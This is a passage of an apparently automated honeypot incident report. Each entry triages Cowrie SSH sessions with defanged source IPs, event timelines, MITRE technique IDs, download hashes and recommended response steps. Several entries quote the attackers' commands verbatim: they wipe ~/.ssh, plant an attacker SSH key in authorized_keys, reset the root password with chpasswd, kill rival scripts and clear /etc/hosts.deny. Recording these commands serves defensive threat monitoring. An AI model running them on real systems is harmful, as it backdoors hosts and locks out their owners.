| `2026-06-13 15:57:02` | `cowrie.log.closed` |
| `2026-06-13 15:57:03` | `cowrie.session.params` |
| `2026-06-13 15:57:03` | `cowrie.command.input` |
| `2026-06-13 15:57:04` | `cowrie.session.file_download` |
| `2026-06-13 15:57:04` | `cowrie.log.closed` |
| `2026-06-13 15:57:06` | `cowrie.session.params` |
| `2026-06-13 15:57:06` | `cowrie.command.input` |
| `2026-06-13 15:57:15` | `cowrie.log.closed` |
| `2026-06-13 15:57:16` | `cowrie.session.params` |
| `2026-06-13 15:57:16` | `cowrie.command.input` |
| `2026-06-13 15:57:16` | `cowrie.log.closed` |
| `2026-06-13 15:57:18` | `cowrie.session.params` |
| `2026-06-13 15:57:18` | `cowrie.command.input` |
| `2026-06-13 15:57:18` | `cowrie.command.input` |
| `2026-06-13 15:57:22` | `cowrie.log.closed` |
| `2026-06-13 15:57:22` | `cowrie.session.params` |
| `2026-06-13 15:57:22` | `cowrie.command.input` |
| `2026-06-13 15:57:23` | `cowrie.log.closed` |
| `2026-06-13 15:57:24` | `cowrie.session.params` |
| `2026-06-13 15:57:24` | `cowrie.command.input` |
| `2026-06-13 15:57:26` | `cowrie.log.closed` |
| `2026-06-13 15:57:27` | `cowrie.session.params` |
| `2026-06-13 15:57:27` | `cowrie.command.input` |
| `2026-06-13 15:57:37` | `cowrie.log.closed` |
| `2026-06-13 15:57:38` | `cowrie.session.params` |
| `2026-06-13 15:57:38` | `cowrie.command.input` |
| `2026-06-13 15:57:39` | `cowrie.log.closed` |
| `2026-06-13 15:57:40` | `cowrie.session.params` |
| `2026-06-13 15:57:40` | `cowrie.command.input` |
| `2026-06-13 15:57:43` | `cowrie.log.closed` |
| `2026-06-13 15:57:44` | `cowrie.session.params` |
| `2026-06-13 15:57:44` | `cowrie.command.input` |
| `2026-06-13 15:57:45` | `cowrie.log.closed` |
| `2026-06-13 15:57:46` | `cowrie.session.params` |
| `2026-06-13 15:57:46` | `cowrie.command.input` |
| `2026-06-13 15:57:48` | `cowrie.log.closed` |
| `2026-06-13 15:57:51` | `cowrie.session.params` |
| `2026-06-13 15:57:51` | `cowrie.command.input` |
| `2026-06-13 15:57:55` | `cowrie.log.closed` |
| `2026-06-13 15:57:55` | `cowrie.session.params` |
| `2026-06-13 15:57:55` | `cowrie.command.input` |
| `2026-06-13 15:57:56` | `cowrie.log.closed` |
| `2026-06-13 15:57:56` | `cowrie.session.params` |
| `2026-06-13 15:57:56` | `cowrie.command.input` |
| `2026-06-13 15:57:57` | `cowrie.log.closed` |
| `2026-06-13 15:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baab1aa4183f

| Field | Detail |
|---|---|
| **Source IP** | `5.178.87[.]159` |
| **First Seen** | 2026-06-13 15:57 |
| **Last Seen** | 2026-06-13 15:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 15:57:49` | `cowrie.session.connect` |
| `2026-06-13 15:57:49` | `cowrie.client.version` |
| `2026-06-13 15:57:50` | `cowrie.client.kex` |
| `2026-06-13 15:57:50` | `cowrie.login.success` |
| `2026-06-13 15:57:51` | `cowrie.session.params` |
| `2026-06-13 15:57:51` | `cowrie.command.input` |
| `2026-06-13 15:57:51` | `cowrie.command.failed` |
| `2026-06-13 15:57:51` | `cowrie.log.closed` |
| `2026-06-13 15:57:52` | `cowrie.session.params` |
| `2026-06-13 15:57:52` | `cowrie.command.input` |
| `2026-06-13 15:57:52` | `cowrie.session.file_download` |
| `2026-06-13 15:57:52` | `cowrie.log.closed` |
| `2026-06-13 15:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.178.87[.]159` to AbuseIPDB if not already reported
- [ ] Block `5.178.87[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba0e845576bf

| Field | Detail |
|---|---|
| **Source IP** | `5.178.87[.]159` |
| **First Seen** | 2026-06-13 15:57 |
| **Last Seen** | 2026-06-13 15:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 15:57:54` | `cowrie.session.connect` |
| `2026-06-13 15:57:54` | `cowrie.client.version` |
| `2026-06-13 15:57:55` | `cowrie.client.kex` |
| `2026-06-13 15:57:56` | `cowrie.login.success` |
| `2026-06-13 15:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.178.87[.]159` to AbuseIPDB if not already reported
- [ ] Block `5.178.87[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e8b5badfd36

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 16:18 |
| **Last Seen** | 2026-06-13 16:23 |
| **Session Duration** | 294s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:uvzWyBHx62rw"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 16:18:19` | `cowrie.session.connect` |
| `2026-06-13 16:18:19` | `cowrie.client.version` |
| `2026-06-13 16:18:20` | `cowrie.client.kex` |
| `2026-06-13 16:18:38` | `cowrie.login.success` |
| `2026-06-13 16:18:40` | `cowrie.session.params` |
| `2026-06-13 16:18:40` | `cowrie.command.input` |
| `2026-06-13 16:18:40` | `cowrie.command.failed` |
| `2026-06-13 16:18:42` | `cowrie.log.closed` |
| `2026-06-13 16:18:42` | `cowrie.session.params` |
| `2026-06-13 16:18:42` | `cowrie.command.input` |
| `2026-06-13 16:18:43` | `cowrie.session.file_download` |
| `2026-06-13 16:18:43` | `cowrie.log.closed` |
| `2026-06-13 16:19:20` | `cowrie.session.params` |
| `2026-06-13 16:19:20` | `cowrie.command.input` |
| `2026-06-13 16:19:21` | `cowrie.log.closed` |
| `2026-06-13 16:19:21` | `cowrie.session.params` |
| `2026-06-13 16:19:21` | `cowrie.command.input` |
| `2026-06-13 16:19:24` | `cowrie.log.closed` |
| `2026-06-13 16:19:25` | `cowrie.session.params` |
| `2026-06-13 16:19:25` | `cowrie.command.input` |
| `2026-06-13 16:19:33` | `cowrie.session.file_download` |
| `2026-06-13 16:19:33` | `cowrie.log.closed` |
| `2026-06-13 16:19:36` | `cowrie.session.params` |
| `2026-06-13 16:19:36` | `cowrie.command.input` |
| `2026-06-13 16:19:40` | `cowrie.log.closed` |
| `2026-06-13 16:19:41` | `cowrie.session.params` |
| `2026-06-13 16:19:41` | `cowrie.command.input` |
| `2026-06-13 16:19:46` | `cowrie.log.closed` |
| `2026-06-13 16:19:48` | `cowrie.session.params` |
| `2026-06-13 16:19:48` | `cowrie.command.input` |
| `2026-06-13 16:19:48` | `cowrie.command.input` |
| `2026-06-13 16:20:17` | `cowrie.log.closed` |
| `2026-06-13 16:20:19` | `cowrie.session.params` |
| `2026-06-13 16:20:19` | `cowrie.command.input` |
| `2026-06-13 16:20:43` | `cowrie.log.closed` |
| `2026-06-13 16:20:58` | `cowrie.session.params` |
| `2026-06-13 16:20:58` | `cowrie.command.input` |
| `2026-06-13 16:21:42` | `cowrie.log.closed` |
| `2026-06-13 16:21:43` | `cowrie.session.params` |
| `2026-06-13 16:21:43` | `cowrie.command.input` |
| `2026-06-13 16:21:44` | `cowrie.log.closed` |
| `2026-06-13 16:21:45` | `cowrie.session.params` |
| `2026-06-13 16:21:45` | `cowrie.command.input` |
| `2026-06-13 16:21:47` | `cowrie.log.closed` |
| `2026-06-13 16:21:47` | `cowrie.session.params` |
| `2026-06-13 16:21:47` | `cowrie.command.input` |
| `2026-06-13 16:21:57` | `cowrie.log.closed` |
| `2026-06-13 16:21:58` | `cowrie.session.params` |
| `2026-06-13 16:21:58` | `cowrie.command.input` |
| `2026-06-13 16:22:00` | `cowrie.log.closed` |
| `2026-06-13 16:22:01` | `cowrie.session.params` |
| `2026-06-13 16:22:01` | `cowrie.command.input` |
| `2026-06-13 16:22:02` | `cowrie.log.closed` |
| `2026-06-13 16:22:13` | `cowrie.session.params` |
| `2026-06-13 16:22:13` | `cowrie.command.input` |
| `2026-06-13 16:22:31` | `cowrie.log.closed` |
| `2026-06-13 16:22:47` | `cowrie.session.params` |
| `2026-06-13 16:22:47` | `cowrie.command.input` |
| `2026-06-13 16:22:57` | `cowrie.log.closed` |
| `2026-06-13 16:23:01` | `cowrie.session.params` |
| `2026-06-13 16:23:01` | `cowrie.command.input` |
| `2026-06-13 16:23:13` | `cowrie.log.closed` |
| `2026-06-13 16:23:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37cfca71d0a6

| Field | Detail |
|---|---|
| **Source IP** | `120.209.186[.]110` |
| **First Seen** | 2026-06-13 16:38 |
| **Last Seen** | 2026-06-13 16:43 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 16:38:48` | `cowrie.session.connect` |
| `2026-06-13 16:38:48` | `cowrie.client.version` |
| `2026-06-13 16:38:48` | `cowrie.client.kex` |
| `2026-06-13 16:38:49` | `cowrie.login.success` |
| `2026-06-13 16:43:49` | `cowrie.session.file_upload` |
| `2026-06-13 16:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.209.186[.]110` to AbuseIPDB if not already reported
- [ ] Block `120.209.186[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bb888a7b875

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 16:49 |
| **Last Seen** | 2026-06-13 16:51 |
| **Session Duration** | 84s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:xGmh4uatpsrQ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 16:49:40` | `cowrie.session.connect` |
| `2026-06-13 16:49:40` | `cowrie.client.version` |
| `2026-06-13 16:49:40` | `cowrie.client.kex` |
| `2026-06-13 16:49:44` | `cowrie.login.success` |
| `2026-06-13 16:49:46` | `cowrie.session.params` |
| `2026-06-13 16:49:46` | `cowrie.command.input` |
| `2026-06-13 16:49:46` | `cowrie.command.failed` |
| `2026-06-13 16:49:50` | `cowrie.log.closed` |
| `2026-06-13 16:50:00` | `cowrie.session.params` |
| `2026-06-13 16:50:00` | `cowrie.command.input` |
| `2026-06-13 16:50:00` | `cowrie.session.file_download` |
| `2026-06-13 16:50:00` | `cowrie.log.closed` |
| `2026-06-13 16:50:17` | `cowrie.session.params` |
| `2026-06-13 16:50:17` | `cowrie.command.input` |
| `2026-06-13 16:50:19` | `cowrie.log.closed` |
| `2026-06-13 16:50:20` | `cowrie.session.params` |
| `2026-06-13 16:50:20` | `cowrie.command.input` |
| `2026-06-13 16:50:21` | `cowrie.log.closed` |
| `2026-06-13 16:50:21` | `cowrie.session.params` |
| `2026-06-13 16:50:21` | `cowrie.command.input` |
| `2026-06-13 16:50:23` | `cowrie.session.file_download` |
| `2026-06-13 16:50:23` | `cowrie.log.closed` |
| `2026-06-13 16:50:24` | `cowrie.session.params` |
| `2026-06-13 16:50:24` | `cowrie.command.input` |
| `2026-06-13 16:50:25` | `cowrie.log.closed` |
| `2026-06-13 16:50:27` | `cowrie.session.params` |
| `2026-06-13 16:50:27` | `cowrie.command.input` |
| `2026-06-13 16:50:29` | `cowrie.log.closed` |
| `2026-06-13 16:50:29` | `cowrie.session.params` |
| `2026-06-13 16:50:29` | `cowrie.command.input` |
| `2026-06-13 16:50:29` | `cowrie.command.input` |
| `2026-06-13 16:50:31` | `cowrie.log.closed` |
| `2026-06-13 16:50:34` | `cowrie.session.params` |
| `2026-06-13 16:50:34` | `cowrie.command.input` |
| `2026-06-13 16:50:35` | `cowrie.log.closed` |
| `2026-06-13 16:50:35` | `cowrie.session.params` |
| `2026-06-13 16:50:35` | `cowrie.command.input` |
| `2026-06-13 16:50:36` | `cowrie.log.closed` |
| `2026-06-13 16:50:36` | `cowrie.session.params` |
| `2026-06-13 16:50:36` | `cowrie.command.input` |
| `2026-06-13 16:50:39` | `cowrie.log.closed` |
| `2026-06-13 16:50:39` | `cowrie.session.params` |
| `2026-06-13 16:50:39` | `cowrie.command.input` |
| `2026-06-13 16:50:42` | `cowrie.log.closed` |
| `2026-06-13 16:50:42` | `cowrie.session.params` |
| `2026-06-13 16:50:42` | `cowrie.command.input` |
| `2026-06-13 16:50:46` | `cowrie.log.closed` |
| `2026-06-13 16:50:55` | `cowrie.session.params` |
| `2026-06-13 16:50:55` | `cowrie.command.input` |
| `2026-06-13 16:50:56` | `cowrie.log.closed` |
| `2026-06-13 16:50:56` | `cowrie.session.params` |
| `2026-06-13 16:50:56` | `cowrie.command.input` |
| `2026-06-13 16:50:58` | `cowrie.log.closed` |
| `2026-06-13 16:50:58` | `cowrie.session.params` |
| `2026-06-13 16:50:58` | `cowrie.command.input` |
| `2026-06-13 16:51:01` | `cowrie.log.closed` |
| `2026-06-13 16:51:01` | `cowrie.session.params` |
| `2026-06-13 16:51:01` | `cowrie.command.input` |
| `2026-06-13 16:51:03` | `cowrie.log.closed` |
| `2026-06-13 16:51:03` | `cowrie.session.params` |
| `2026-06-13 16:51:03` | `cowrie.command.input` |
| `2026-06-13 16:51:04` | `cowrie.log.closed` |
| `2026-06-13 16:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e77ddf3b95d5

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:06 |
| **Last Seen** | 2026-06-13 17:06 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:06:29` | `cowrie.session.connect` |
| `2026-06-13 17:06:29` | `cowrie.client.version` |
| `2026-06-13 17:06:30` | `cowrie.client.kex` |
| `2026-06-13 17:06:34` | `cowrie.login.success` |
| `2026-06-13 17:06:37` | `cowrie.session.params` |
| `2026-06-13 17:06:37` | `cowrie.command.input` |
| `2026-06-13 17:06:37` | `cowrie.command.failed` |
| `2026-06-13 17:06:39` | `cowrie.log.closed` |
| `2026-06-13 17:06:39` | `cowrie.session.params` |
| `2026-06-13 17:06:39` | `cowrie.command.input` |
| `2026-06-13 17:06:41` | `cowrie.session.file_download` |
| `2026-06-13 17:06:41` | `cowrie.log.closed` |
| `2026-06-13 17:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b22f7910a982

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:06 |
| **Last Seen** | 2026-06-13 17:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:06:46` | `cowrie.session.connect` |
| `2026-06-13 17:06:46` | `cowrie.client.version` |
| `2026-06-13 17:06:49` | `cowrie.client.kex` |
| `2026-06-13 17:06:55` | `cowrie.login.success` |
| `2026-06-13 17:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-711fb6764598

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:13 |
| **Last Seen** | 2026-06-13 17:13 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:13:00` | `cowrie.session.connect` |
| `2026-06-13 17:13:00` | `cowrie.client.version` |
| `2026-06-13 17:13:03` | `cowrie.client.kex` |
| `2026-06-13 17:13:07` | `cowrie.login.success` |
| `2026-06-13 17:13:12` | `cowrie.session.params` |
| `2026-06-13 17:13:12` | `cowrie.command.input` |
| `2026-06-13 17:13:12` | `cowrie.command.failed` |
| `2026-06-13 17:13:13` | `cowrie.log.closed` |
| `2026-06-13 17:13:14` | `cowrie.session.params` |
| `2026-06-13 17:13:14` | `cowrie.command.input` |
| `2026-06-13 17:13:16` | `cowrie.session.file_download` |
| `2026-06-13 17:13:16` | `cowrie.log.closed` |
| `2026-06-13 17:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a39e891b868d

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:13 |
| **Last Seen** | 2026-06-13 17:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:13:24` | `cowrie.session.connect` |
| `2026-06-13 17:13:24` | `cowrie.client.version` |
| `2026-06-13 17:13:25` | `cowrie.client.kex` |
| `2026-06-13 17:13:27` | `cowrie.login.success` |
| `2026-06-13 17:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9b79c0ca773

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:25 |
| **Last Seen** | 2026-06-13 17:25 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:25:18` | `cowrie.session.connect` |
| `2026-06-13 17:25:18` | `cowrie.client.version` |
| `2026-06-13 17:25:19` | `cowrie.client.kex` |
| `2026-06-13 17:25:25` | `cowrie.login.success` |
| `2026-06-13 17:25:26` | `cowrie.session.params` |
| `2026-06-13 17:25:26` | `cowrie.command.input` |
| `2026-06-13 17:25:26` | `cowrie.command.failed` |
| `2026-06-13 17:25:27` | `cowrie.log.closed` |
| `2026-06-13 17:25:35` | `cowrie.session.params` |
| `2026-06-13 17:25:35` | `cowrie.command.input` |
| `2026-06-13 17:25:35` | `cowrie.session.file_download` |
| `2026-06-13 17:25:35` | `cowrie.log.closed` |
| `2026-06-13 17:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c59202c6656e

| Field | Detail |
|---|---|
| **Source IP** | `194.124.210[.]127` |
| **First Seen** | 2026-06-13 17:25 |
| **Last Seen** | 2026-06-13 17:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 17:25:43` | `cowrie.session.connect` |
| `2026-06-13 17:25:43` | `cowrie.client.version` |
| `2026-06-13 17:25:43` | `cowrie.client.kex` |
| `2026-06-13 17:25:54` | `cowrie.login.success` |
| `2026-06-13 17:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.124.210[.]127` to AbuseIPDB if not already reported
- [ ] Block `194.124.210[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

